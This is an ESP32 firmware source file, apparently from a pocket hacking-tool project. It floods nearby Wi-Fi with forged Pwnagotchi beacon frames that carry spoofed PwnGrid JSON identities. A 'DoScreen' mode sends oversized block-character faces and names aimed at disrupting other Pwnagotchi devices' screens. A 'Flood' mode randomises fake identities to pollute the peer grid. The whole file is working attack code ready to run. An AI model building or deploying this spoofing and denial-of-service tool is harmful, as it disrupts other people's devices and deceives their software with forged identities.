#include <ArduinoJson.h>
#include "esp_wifi.h"
#include "nvs_flash.h"

#include "core/display.h"
#include "core/mykeyboard.h"
#include "core/sd_functions.h"
#include "spam.h"

// Global flag to control the spam task
volatile bool spamRunning = false;
volatile bool stop_beacon = false;
volatile bool dos_pwnd = false;
volatile bool change_identity = false;

// Global arrays to hold the faces and names
const char* faces[30];  // Increase size if needed
const char* names[30];  // Increase size if needed
int num_faces = 0;
int num_names = 0;

// Forward declarations
void displaySpamStatus();
void loadFacesAndNames();

// Définir la trame beacon brute
const uint8_t beacon_frame_template[] = {
  0x80, 0x00,                          // Frame Control
  0x00, 0x00,                          // Duration
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff,  // Destination Address (Broadcast)
  0xde, 0xad, 0xbe, 0xef, 0xde, 0xad,  // Source Address (SA)
  0xde, 0xad, 0xbe, 0xef, 0xde, 0xad,  // BSSID
  0x00, 0x00,                          // Sequence/Fragment number
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // Timestamp
  0x64, 0x00,  // Beacon interval
  0x11, 0x04   // Capability info
};


// Function to generate a random string that resembles a SHA-256 hash
String generate_random_identity() {
  const char hex_chars[] = "0123456789abcdef";
  String random_identity = "";
  for (int i = 0; i < 64; ++i) {
    random_identity += hex_chars[random(0, 16)];
  }
  return random_identity;
}

void send_pwnagotchi_beacon(uint8_t channel, const char* face, const char* name) {
  DynamicJsonDocument json(2048);
  json["pal"] = true;
  json["name"] = name;
  json["face"] = face; // change to {} to freeze the screen
  json["epoch"] = 1;
  json["grid_version"] = "1.10.3";
  if (change_identity) {
    json["identity"] = generate_random_identity();
  } else {
    json["identity"] = "32e9f315e92d974342c93d0fd952a914bfb4e6838953536ea6f63d54db6b9610";
  }
  json["pwnd_run"] = 0;
  json["pwnd_tot"] = 0;
  json["session_id"] = "a2:00:64:e6:0b:8b";
  json["timestamp"] = 0;
  json["uptime"] = 0;
  json["version"] = "1.8.4";
  json["policy"]["advertise"] = true;
  json["policy"]["bond_encounters_factor"] = 20000;
  json["policy"]["bored_num_epochs"] = 0;
  json["policy"]["sad_num_epochs"] = 0;
  json["policy"]["excited_num_epochs"] = 9999;

  String json_str;
  serializeJson(json, json_str);

  uint16_t json_len = json_str.length();
  uint8_t header_len = 2 + ((json_len / 255) * 2);
  uint8_t beacon_frame[sizeof(beacon_frame_template) + json_len + header_len];
  memcpy(beacon_frame, beacon_frame_template, sizeof(beacon_frame_template));

  // Ajout des données JSON à la trame beacon
  int frame_byte = sizeof(beacon_frame_template);
  for (int i = 0; i < json_len; i++) {
    if (i == 0 || i % 255 == 0) {
      beacon_frame[frame_byte++] = 0xde;  // AC = 222
      uint8_t payload_len = 255;
      if (json_len - i < 255) {
        payload_len = json_len - i;
      }
      beacon_frame[frame_byte++] = payload_len;
    }
    beacon_frame[frame_byte++] = (uint8_t)json_str[i];
  }

  // Définir le canal et envoyer la trame
  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
  esp_wifi_80211_tx(WIFI_IF_AP, beacon_frame, sizeof(beacon_frame), false);
}

const char* pwnd_faces[] = {
  "NOPWND!■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■\n■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■"
};
const char* pwnd_names[] = {
  "■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■"
};

// Tâche pour envoyer des trames beacon avec changement de face, de nom et de canal
void beacon_task(void* pvParameters) {
  const uint8_t channels[] = {1, 6, 11};  // Liste des canaux Wi-Fi à utiliser
  const int num_channels = sizeof(channels) / sizeof(channels[0]);
  const int num_pwnd_faces = sizeof(pwnd_faces) / sizeof(pwnd_faces[0]);

  while (spamRunning) {
    if (dos_pwnd) {
      // Send PWND beacons
      for (int ch = 0; ch < num_channels; ++ch) {
        if (stop_beacon) {
          break;
        }
        send_pwnagotchi_beacon(channels[ch], pwnd_faces[0], pwnd_names[0]);
        vTaskDelay(200 / portTICK_PERIOD_MS);  // Wait 200 ms
      }
    } else {
      // Send regular beacons
      for (int i = 0; i < num_faces; ++i) {
        for (int ch = 0; ch < num_channels; ++ch) {
          if (stop_beacon) {
            break;
          }
          send_pwnagotchi_beacon(channels[ch], faces[i], names[i % num_names]);
          vTaskDelay(200 / portTICK_PERIOD_MS);  // Wait 200 ms
        }
      }
    }
  }

  vTaskDelete(NULL);
}

void displaySpamStatus() {
  tft.fillRect(0, 20, WIDTH, HEIGHT - 40, BGCOLOR);
  tft.setTextSize(1.5);
  tft.setCursor(0, 20);
  tft.println("PwnGrid Spam Running...");

  int current_face_index = 0;
  int current_name_index = 0;
  int current_channel_index = 0;
  const uint8_t channels[] = {1, 6, 11};
  const int num_channels = sizeof(channels) / sizeof(channels[0]);

  while (spamRunning) {

    if(checkEscPress()) {
      break;
    }
    if (checkSelPress()) {
      dos_pwnd = !dos_pwnd;
      Serial.printf("DoScreen %s.\n", dos_pwnd ? "enabled" : "disabled");
    }
    if (checkNextPress()) {
      change_identity = !change_identity;
      Serial.printf("Change Identity %s.\n", change_identity ? "enabled" : "disabled");
    }

    // Update and display current face, name, and channel
    tft.setCursor(45, 45);
    tft.printf("Flood:%s", change_identity ? "1" : "0");
    tft.setCursor(125, 45);
    tft.printf("DoScreen:%s", dos_pwnd ? "1" : "0");
    if (!dos_pwnd) {
      tft.setCursor(0, 50);
      tft.printf("Face: \n%s                                              ", faces[current_face_index]);
      tft.setCursor(0, 80);
      tft.printf("Name:                  \n%s                                              ", names[current_name_index]);
    } else {
      tft.setCursor(0, 50);
      tft.printf("Face:\nNOPWND!■■■■■■■■■■■■■■■■■");
      tft.setCursor(0, 80);
      tft.printf("Name:\n■■■■■■■■■■■■■■■■■■■■■■");
    }
    tft.setCursor(0, 110);
    tft.printf("Channel: %d  ", channels[current_channel_index]);

    // Update indices for next display
    current_face_index = (current_face_index + 1) % num_faces;
    current_name_index = (current_name_index + 1) % num_names;
    current_channel_index = (current_channel_index + 1) % num_channels;

    delay(200); // Update the display every 200 ms
  }
}


void loadFacesAndNames() {
  String filepath = "/pwnagotchi/pwngridspam.txt";
  File file;

  if (SD.exists(filepath)) {
    file = SD.open(filepath, FILE_READ);
  }
  else if (LittleFS.exists(filepath)) {
    file = LittleFS.open(filepath, FILE_READ);
  }
  else {
    Serial.println("Failed to open pwngrid file for reading");
    return;
  }

  while (file.available()) {
    String line = file.readStringUntil('\n');
    if (line.startsWith("faces=")) {
      String faces_line = line.substring(6);
      faces_line.replace("\"", "");  // Remove quotes
      faces_line.trim();  // Remove leading/trailing whitespace
      faces_line.replace("\\n", "\n");  // Handle newline characters
      int start = 0;
      int end = faces_line.indexOf(',', start);
      num_faces = 0;
      while (end != -1) {
        faces[num_faces++] = strdup(faces_line.substring(start, end).c_str());
        start = end + 1;
        end = faces_line.indexOf(',', start);
      }
      faces[num_faces++] = strdup(faces_line.substring(start).c_str());
    } else if (line.startsWith("names=")) {
      String names_line = line.substring(6);
      names_line.replace("\"", "");  // Remove quotes
      names_line.trim();  // Remove leading/trailing whitespace
      int start = 0;
      int end = names_line.indexOf(',', start);
      num_names = 0;
      while (end != -1) {
        names[num_names++] = strdup(names_line.substring(start, end).c_str());
        start = end + 1;
        end = names_line.indexOf(',', start);
      }
      names[num_names++] = strdup(names_line.substring(start).c_str());
    }
  }
  file.close();
}

void send_pwnagotchi_beacon_main() {
  // Initialiser NVS
  esp_err_t ret = nvs_flash_init();
  if (ret == ESP_ERR_NVS_NO_FREE_PAGES || ret == ESP_ERR_NVS_NEW_VERSION_FOUND) {
    ESP_ERROR_CHECK(nvs_flash_erase());
    ret = nvs_flash_init();
  }
  ESP_ERROR_CHECK(ret);

  // Initialiser la configuration Wi-Fi
  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
  ESP_ERROR_CHECK(esp_wifi_init(&cfg));
  ESP_ERROR_CHECK(esp_wifi_set_storage(WIFI_STORAGE_RAM));
  ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_AP));
  ESP_ERROR_CHECK(esp_wifi_start());

  // Load faces and names from the file
  loadFacesAndNames();

  // Check if file was loaded
  if (num_faces == 0 or num_names == 0) {
    displayRedStripe("No config file", TFT_WHITE, FGCOLOR);
    delay(1000);
    return;
  }

  // Set the spamRunning flag to true
  spamRunning = true;

  // Clear screen
  tft.fillRect(0, 20, WIDTH, HEIGHT - 40, BGCOLOR);

  // Créer la tâche beacon
  xTaskCreate(&beacon_task, "beacon_task", 4096, NULL, 5, NULL);

  // Display the spam status and wait for user input
  displaySpamStatus();
}
